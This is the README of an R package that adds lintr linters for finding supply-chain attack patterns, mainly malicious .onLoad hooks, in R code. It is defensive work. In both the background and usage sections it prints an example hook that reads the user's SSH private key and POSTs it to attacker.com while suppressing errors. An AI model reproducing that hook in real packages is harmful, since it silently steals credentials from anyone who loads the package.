# lintrsecurity

`lintrsecurity` provides [linters](https://en.wikipedia.org/wiki/Lint_(software)) for use with the [`lintr`](https://lintr.r-lib.org/) package to detect security-relevant patterns in R source code. The package is intended to support secure R package development and supply chain security research.

## Background

R packages are the primary mechanism for sharing R code. When you run `install.packages()` or `library()`, R executes code from the package automatically -- code you may never have read. This creates an attack surface: a malicious or compromised package can run arbitrary code on your system the moment you install or load it, without any action beyond your normal R workflow.

This is not a theoretical risk. The same attack pattern has been documented repeatedly in other package ecosystems. In 2018, a malicious contributor to the widely-used npm package `event-stream` introduced code that stole cryptocurrency wallets from a specific target. In 2024, the `ultralytics` machine learning package on PyPI was compromised to distribute a cryptominer to its users. CRAN has received little systematic security scrutiny compared to these ecosystems, despite R's deep penetration in environments processing sensitive data: clinical trial analysis, government statistics, financial risk modeling, and academic research.

### How R packages execute code automatically

The initial release of `lintrsecurity` focuses on **lifecycle hooks**, which are functions that R calls automatically during package loading. `.onLoad()` runs when a package's namespace is loaded, and `.onAttach()` runs when the package is attached to the search path -- both triggered by a call to `library()`. Code inside these functions runs with the privileges of the user running R, before the user has any opportunity to review it.

A minimal example of what a malicious `.onLoad` hook might look like:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
```

This code reads the user's SSH private key and sends it to an external server whenever the package is loaded. The `tryCatch()` wrapper suppresses any errors, so the package loads normally and the user sees nothing unusual.

### What `lintrsecurity` does

`lintrsecurity` provides linters for use with the [`lintr`](https://lintr.r-lib.org/) package that detect patterns in R source code associated with these attack vectors. It is designed for two audiences:

- **R package authors** who want to ensure their own code does not contain dangerous patterns, whether introduced accidentally or by a malicious contributor via a pull request.

- **Security reviewers** auditing third-party packages before use in sensitive environments.

Static analysis cannot detect all malicious code -- a determined attacker can obfuscate dangerous patterns beyond what any source-level tool can reliably identify. `lintrsecurity` is one layer of defense, not a complete solution. Its value is catching naive attacks, surfacing patterns that warrant manual review, and enabling systematic measurement of the R package ecosystem's attack surface.

Findings are mapped to the [MITRE ATT&CK](https://attack.mitre.org/) framework, the standard vocabulary for describing adversarial behavior, to help security teams integrate `lintrsecurity` findings into their existing threat analysis workflows.

## Installation

You can install the development version of `lintrsecurity` as follows:

``` r
pak::pak('tylerjssmith/lintrsecurity')
```

## Usage

The security-focused linters are used in `lintr` calls. See `lintr` [vignette](https://lintr.r-lib.org/articles/lintr.html) for an overview. A script may be scanned as follows:

``` r
library(lintr)
library(lintrsecurity)

malicious <- '
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
'

lintr::lint(text = malicious, linters = lintrsecurity::lintrsecurity_linters())
```




